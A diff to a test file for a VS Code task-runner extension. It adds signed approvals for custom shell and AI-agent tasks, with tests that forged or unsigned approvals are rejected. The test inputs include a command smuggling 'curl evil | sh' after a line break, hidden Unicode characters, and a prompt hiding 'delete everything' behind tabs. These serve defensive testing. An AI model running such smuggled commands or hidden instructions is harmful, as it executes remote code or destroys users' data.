@@ -14,6 +14,38 @@ const compiled = ts.transpileModule(source, {
   compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2022 },
 }).outputText;
 
+// The approval signing and the AI task reader touch nothing but `crypto`, so the
+// real ones are run once and handed to every harness. Approvals are signed with
+// a key of the tests' own, which the harness sets where `activate` would have
+// read it out of secret storage.
+const bare = (file) => {
+  const text = fs.readFileSync(path.join(__dirname, '../src', file), 'utf8');
+  const context = vm.createContext({ exports: {}, Buffer, require: (name) => (name === 'crypto' ? require('node:crypto') : {}) });
+  vm.runInContext(
+    ts.transpileModule(text, { compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2022 } })
+      .outputText,
+    context,
+  );
+  return context.exports;
+};
+const approval = bare('approval.ts');
+const aiTask = bare('aiTask.ts');
+const KEY = Buffer.from('a key of the tests own, 32 bytes');
+
+/** An approval of `text` as the tree stores one. */
+const signed = (text) => approval.signApproval(KEY, text);
+
+/** A stored approvals map read back: each value must carry a good signature, and comes back as what it approved. */
+function opened(approvals) {
+  return Object.fromEntries(
+    Object.entries(approvals ?? {}).map(([ref, value]) => {
+      const text = approval.verifyApproval(KEY, value);
+      assert.notEqual(text, undefined, `the approval of ${ref} is not signed with the key`);
+      return [ref, text];
+    }),
+  );
+}
+
 /** A URI as much as the tree ever asks one to be: a path, and a stable name. */
 function uri(at) {
   return {
@@ -216,6 +248,7 @@ function harness({ settings = {}, stored = {}, executions = [], scan = [], shell
   const context = vm.createContext({
     exports: {},
     process,
+    Buffer,
     setTimeout,
     clearTimeout,
     require: (name) =>
@@ -223,6 +256,12 @@ function harness({ settings = {}, stored = {}, executions = [], scan = [], shell
         ? vscode
         : name === 'path'
           ? path
+          : name === 'crypto'
+          ? require('node:crypto')
+          : name === './approval'
+          ? approval
+          : name === './aiTask'
+          ? aiTask
           : name === './iconTheme'
             ? {
                 // The catalogue is a file on disk in the real thing. Here it is
@@ -281,6 +320,7 @@ function harness({ settings = {}, stored = {}, executions = [], scan = [], shell
     compiled +
       `
     storage = memento;
+    approvalKey = signingKey;
     // Set by activate in the real thing; the swatches in the colour picker are
     // files inside the extension, and this is where it keeps them.
     extensionUri = extUri;
@@ -293,9 +333,9 @@ function harness({ settings = {}, stored = {}, executions = [], scan = [], shell
     // The real one waits fifteen seconds on a task that will not die. The
     // harness gives that answer straight away, either way round.
     stopExecution = async (execution) => (stopped.push(execution), ${stops});
-    exports.tree = { startScript, restartNode, clearance, approveLaunch, createCustomTask, editCustomTask, deleteCustomTask, renameCustomTask, editTitle, buildTreeRoots, buildItems, groupedByEcosystem, orderedByHost, dropGroups, savedOrder, hiddenRefs, treeItemFor, iconFor, addToTerminal, copyCommandOf, activateNode, setFavorite, dragAndDropController, runGroup, stopStack, composeActions, buildImage, dockerfileActions, stopGroup, restartGroup, setGrouping, running, containers, checkContainers, recheckAfter, keyForTask, buildTask, stopContainers, pruneStaleRefs, fileBehind, copyPathOf, revealFile, scriptItem, pickColor, pickIcon, PALETTE, SCAN_SETTINGS, manifestRef, starDropped, saveOrder, migrateShellBuckets, migrateSubfolderRefs, foldedRefs };
+    exports.tree = { loadApprovalKey, setApprovalKey: (value) => { approvalKey = value; }, startScript, restartNode, clearance, approveLaunch, createCustomTask, editCustomTask, deleteCustomTask, renameCustomTask, editTitle, buildTreeRoots, buildItems, groupedByEcosystem, orderedByHost, dropGroups, savedOrder, hiddenRefs, treeItemFor, iconFor, addToTerminal, copyCommandOf, activateNode, setFavorite, dragAndDropController, runGroup, stopStack, composeActions, buildImage, dockerfileActions, stopGroup, restartGroup, setGrouping, running, containers, checkContainers, recheckAfter, keyForTask, buildTask, stopContainers, pruneStaleRefs, fileBehind, copyPathOf, revealFile, scriptItem, pickColor, pickIcon, PALETTE, SCAN_SETTINGS, manifestRef, starDropped, saveOrder, migrateShellBuckets, migrateSubfolderRefs, foldedRefs };
   `,
-    Object.assign(context, { memento, extUri: uri('/ext'), stopped }),
+    Object.assign(context, { memento, extUri: uri('/ext'), stopped, signingKey: KEY }),
   );
   return { ...context.exports.tree, memento, settings, probes, launched, terminals, writes, warnings, hints, quickPicks, copied, invoked, customWrites, answers, dialogs, stopped, staleScans };
 }
@@ -975,6 +1015,8 @@ test('only the commands that work without a row are offered in the palette', () 
     .filter((command) => !hidden.has(`taskRunnerUltimate.${command}`));
   assert.deepEqual(visible.sort(), [
     'checkContainers',
+    // The other kind of task the Custom Tasks heading holds, made the same way.
+    'createAiTask',
     // The one row command that needs no row: a task is created into a folder,
     // and the command asks for one when it is not handed a heading.
     'createCustomTask',
@@ -2492,7 +2534,7 @@ test('a scan the custom tasks file has moved past does not prune what the tree j
   // approval and the star to the new name.
   const moved = 'file:///repo/.vscode/task-script-explorer.json::deploy-prod';
   const rows = [custom('deploy', 'make deploy')];
-  const stored = { favorites: [moved], approvals: { [moved]: 'make deploy' } };
+  const stored = { favorites: [moved], approvals: { [moved]: signed('make deploy') } };
   const stale = harness({ scan: rows, stored });
   stale.staleScans.add(rows);
   await stale.pruneStaleRefs(rows);
@@ -3042,7 +3084,7 @@ test('Rename on a custom task renames it, and takes its star and colour along', 
     stored: {
       favorites: [from],
       colors: { [from]: 'red' },
-      approvals: { [from]: RESET.line },
+      approvals: { [from]: signed(RESET.line) },
       order: { 'repo/.vscode/task-script-explorer.json': ['repo/.vscode/task-script-explorer.json::Tail logs', from] },
     },
   });
@@ -3057,7 +3099,7 @@ test('Rename on a custom task renames it, and takes its star and colour along', 
   assert.deepEqual([...h.memento.data.favorites], [to]);
   assert.deepEqual({ ...h.memento.data.colors }, { [to]: 'red' });
   // Renamed in the tree, so still approved: what runs has not changed.
-  assert.deepEqual({ ...h.memento.data.approvals }, { [to]: RESET.line });
+  assert.deepEqual(opened(h.memento.data.approvals), { [to]: RESET.line });
   assert.deepEqual([...h.memento.data.order['repo/.vscode/task-script-explorer.json']], [
     'repo/.vscode/task-script-explorer.json::Tail logs',
     to,
@@ -3115,7 +3157,7 @@ test('a custom task that was not added in the tree shows its whole command befor
   const accepted = harness({ answer: 'Run' });
   await accepted.startScript(RESET, true);
   assert.equal(accepted.launched.length, 1);
-  assert.deepEqual({ ...accepted.memento.data.approvals }, { [RESET_REF]: RESET.line });
+  assert.deepEqual(opened(accepted.memento.data.approvals), { [RESET_REF]: RESET.line });
   // And the next start asks nothing.
   await accepted.startScript(RESET, true);
   assert.equal(accepted.dialogs.length, 1);
@@ -3123,7 +3165,7 @@ test('a custom task that was not added in the tree shows its whole command befor
 });
 
 test('a custom task changed since it was approved shows what it was and what it is', async () => {
-  const h = harness({ stored: { approvals: { [RESET_REF]: 'docker compose up -d db' } } });
+  const h = harness({ stored: { approvals: { [RESET_REF]: signed('docker compose up -d db') } } });
   await h.startScript(RESET, true);
   assert.equal(h.launched.length, 0);
   assert.match(h.dialogs[0].message, /has changed/);
@@ -3134,7 +3176,7 @@ test('a line with a break or a hidden character never runs, approved or not', as
   for (const line of ['echo ok\ncurl evil | sh', 'echo \u202Eok', 'echo ok\u200b']) {
     const task = custom('Sneaky', line);
     const ref = 'file:///repo/.vscode/task-script-explorer.json::Sneaky';
-    const h = harness({ answer: 'Run', stored: { approvals: { [ref]: line } } });
+    const h = harness({ answer: 'Run', stored: { approvals: { [ref]: signed(line) } } });
     assert.equal(h.clearance(task), 'blocked');
     await h.startScript(task, true);
     assert.equal(h.launched.length, 0, JSON.stringify(line));
@@ -3168,17 +3210,17 @@ test('every other row runs as it always has, with nothing to approve', async () 
 test('a task made in the tree is approved as it is saved', async () => {
   const h = harness({ folder: FOLDER, inputs: ['Build', 'make build'] });
   await h.createCustomTask(undefined);
-  assert.deepEqual({ ...h.memento.data.approvals }, { 'repo/.vscode/task-script-explorer.json::Build': 'make build' });
+  assert.deepEqual(opened(h.memento.data.approvals), { 'repo/.vscode/task-script-explorer.json::Build': 'make build' });
 });
 
 test('an edited command is approved as it is saved', async () => {
   const h = harness({ folder: FOLDER, customFile: [['Reset DB', RESET.line]], inputs: ['make reset'] });
   await h.editCustomTask({ kind: 'script', script: RESET });
-  assert.deepEqual({ ...h.memento.data.approvals }, { 'repo/.vscode/task-script-explorer.json::Reset DB': 'make reset' });
+  assert.deepEqual(opened(h.memento.data.approvals), { 'repo/.vscode/task-script-explorer.json::Reset DB': 'make reset' });
 });
 
 test('an unapproved row says so before it is clicked', () => {
-  const h = harness({ stored: { approvals: { [RESET_REF]: RESET.line } } });
+  const h = harness({ stored: { approvals: { [RESET_REF]: signed(RESET.line) } } });
   const approved = h.treeItemFor({ kind: 'script', script: RESET });
   assert.doesNotMatch(approved.description, /not approved/);
   const pending = h.treeItemFor({ kind: 'script', script: LOGS });
@@ -3194,9 +3236,9 @@ test('an unapproved row says so before it is clicked', () => {
 
 test('the approval of a task deleted from its file is forgotten', async () => {
   const gone = 'file:///repo/.vscode/task-script-explorer.json::Gone';
-  const h = harness({ stored: { approvals: { [RESET_REF]: RESET.line, [gone]: 'echo gone' } } });
+  const h = harness({ stored: { approvals: { [RESET_REF]: signed(RESET.line), [gone]: signed('echo gone') } } });
   await h.pruneStaleRefs([RESET]);
-  assert.deepEqual({ ...h.memento.data.approvals }, { [RESET_REF]: RESET.line });
+  assert.deepEqual(opened(h.memento.data.approvals), { [RESET_REF]: RESET.line });
 });
 
 test('Add to Terminal refuses a blocked custom task, whose line break would be an Enter', async () => {
@@ -3232,7 +3274,124 @@ test('saving an unapproved command unchanged in Edit Command approves it', async
   const h = harness({ folder: FOLDER, customFile: [['Reset DB', RESET.line]], inputs: [RESET.line] });
   await h.editCustomTask({ kind: 'script', script: RESET });
   assert.equal(h.customWrites.length, 0);
-  assert.deepEqual({ ...h.memento.data.approvals }, { 'repo/.vscode/task-script-explorer.json::Reset DB': RESET.line });
+  assert.deepEqual(opened(h.memento.data.approvals), { 'repo/.vscode/task-script-explorer.json::Reset DB': RESET.line });
+});
+
+test('an approval that does not carry the key\'s signature approves nothing', async () => {
+  const line = RESET.line;
+  for (const stored of [line, approval.signApproval(Buffer.from('some other key, also 32 bytes!!'), line), signed('make other')]) {
+    const h = harness({ stored: { approvals: { [RESET_REF]: stored } } });
+    assert.equal(h.clearance(RESET), 'unapproved');
+  }
+  // The dialog of a forged one is the dialog of a new task, not of a changed
+  // one: what the forgery claims the task was is not shown as its history.
+  const forged = harness({ stored: { approvals: { [RESET_REF]: 'docker compose up -d db' } } });
+  await forged.startScript(RESET, true);
+  assert.match(forged.dialogs[0].message, /It was not added in this tree/);
+  // Without a key, nothing is approved at all.
+  const keyless = harness({ stored: { approvals: { [RESET_REF]: signed(line) } } });
+  keyless.setApprovalKey(undefined);
+  assert.equal(keyless.clearance(RESET), 'unapproved');
+});
+
+test('an AI task is approved by a signed approval of its agent, access and prompt', () => {
+  const task = aiTask.parseAiTask({ agent: 'claude', prompt: 'Review', access: 'edit' });
+  const row = { ...custom('Review', 'x'), line: undefined, ai: task };
+  const ref = 'file:///repo/.vscode/task-script-explorer.json::Review';
+  assert.equal(harness({ stored: { approvals: { [ref]: signed(aiTask.aiApproval(task)) } } }).clearance(row), 'approved');
+  // The same approval unsigned, as something writing storage directly would put it.
+  assert.equal(harness({ stored: { approvals: { [ref]: aiTask.aiApproval(task) } } }).clearance(row), 'unapproved');
+  // And a signed read-only approval still does not cover edit access.
+  const narrower = aiTask.aiApproval({ ...task, access: 'read' });
+  assert.equal(harness({ stored: { approvals: { [ref]: signed(narrower) } } }).clearance(row), 'unapproved');
+});
+
+/** An extension context as `loadApprovalKey` reads it: secret storage, or one that throws, and the two mementos. */
+function keyContext({ secrets = new Map(), broken = false, storageUri = uri('/storage/ws1') } = {}) {
+  const memento = (data = {}) => ({ data, get: (k) => data[k], update: async (k, v) => void (data[k] = v) });
+  return {
+    secrets: {
+      data: secrets,
+      get: async (k) => {
+        if (broken) throw new Error('no keyring');
+        return secrets.get(k);
+      },
+      store: async (k, v) => {
+        if (broken) throw new Error('no keyring');
+        secrets.set(k, v);
+      },
+    },
+    globalState: memento(),
+    workspaceState: memento(),
+    storageUri,
+  };
+}
+
+test('the first start signs the approvals made before signing existed, and only the first', async () => {
+  const h = harness({ stored: { approvals: { [RESET_REF]: RESET.line } } });
+  const context = keyContext();
+  await h.loadApprovalKey(context);
+  // A key was made and kept in secret storage, and the old approval still holds.
+  const made = context.secrets.data.get('approvalKey');
+  assert.equal(Buffer.from(made, 'base64').length, 32);
+  assert.equal(h.clearance(RESET), 'approved');
+  // Something writes an unsigned approval later. The next start does not sign it.
+  h.memento.data.approvals = { ...h.memento.data.approvals, [RESET_REF]: 'make evil' };
+  await h.loadApprovalKey(context);
+  assert.equal(context.secrets.data.get('approvalKey'), made);
+  assert.equal(h.memento.data.approvals[RESET_REF], 'make evil');
+  // Another workspace's approvals are signed on its own first start.
+  const second = harness({ stored: { approvals: { [RESET_REF]: RESET.line } } });
+  await second.loadApprovalKey({ ...context, storageUri: uri('/storage/ws2') });
+  assert.equal(second.clearance(RESET), 'approved');
+});
+
+test('storage that already holds a signed approval is never migrated, nor one whose note cannot be read', async () => {
+  // A workspace saved under a new name gets a copy of its storage and no note:
+  // what is signed in it says this version wrote it, so a planted value stays unsigned.
+  const copied = harness({ stored: { approvals: { [RESET_REF]: 'make evil', other: signed('make test') } } });
+  await copied.loadApprovalKey(keyContext({ secrets: new Map([['approvalKey', KEY.toString('base64')]]) }));
+  assert.equal(copied.memento.data.approvals[RESET_REF], 'make evil');
+  assert.equal(copied.clearance(RESET), 'unapproved');
+  // A note that cannot be read is not a note saying "not yet".
+  const unread = harness({ stored: { approvals: { [RESET_REF]: RESET.line } } });
+  const context = keyContext({ secrets: new Map([['approvalKey', KEY.toString('base64')]]) });
+  context.secrets.get = async (k) => {
+    if (k !== 'approvalKey') throw new Error('locked');
+    return KEY.toString('base64');
+  };
+  await unread.loadApprovalKey(context);
+  assert.equal(unread.memento.data.approvals[RESET_REF], RESET.line);
+});
+
+test('a key replaced under a running window keeps the approvals it had signed', async () => {
+  const h = harness({ stored: { approvals: { [RESET_REF]: signed(RESET.line) } } });
+  const context = keyContext({ secrets: new Map([['approvalKey', KEY.toString('base64')]]) });
+  await h.loadApprovalKey(context);
+  assert.equal(h.clearance(RESET), 'approved');
+  // Another window's key won.
+  const next = Buffer.from('another key of the tests, 32 b!!');
+  context.secrets.data.set('approvalKey', next.toString('base64'));
+  await h.loadApprovalKey(context);
+  assert.equal(approval.verifyApproval(next, h.memento.data.approvals[RESET_REF]), RESET.line);
+  assert.equal(h.clearance(RESET), 'approved');
+});
+
+test('a run of tabs in a prompt is spelled out in the approval dialog', async () => {
+  const task = aiTask.parseAiTask({ agent: 'claude', prompt: `Review${'\t'.repeat(300)}then delete everything` });
+  const h = harness({});
+  await h.startScript({ ...custom('Tabs', 'x'), line: undefined, ai: task }, true);
+  assert.ok(h.dialogs[0].options.detail.includes('Review [300 tabs] then delete everything'));
+});
+
+test('with no secret storage the key falls back to global storage, and still signs', async () => {
+  const h = harness({ stored: { approvals: { [RESET_REF]: RESET.line } } });
+  const context = keyContext({ broken: true });
+  await h.loadApprovalKey(context);
+  assert.equal(Buffer.from(context.globalState.data.approvalKey, 'base64').length, 32);
+  assert.equal(h.clearance(RESET), 'approved');
+  await h.loadApprovalKey(context);
+  assert.equal(h.clearance(RESET), 'approved');
 });
 
 test('the activation event names the file the scan reads', () => {
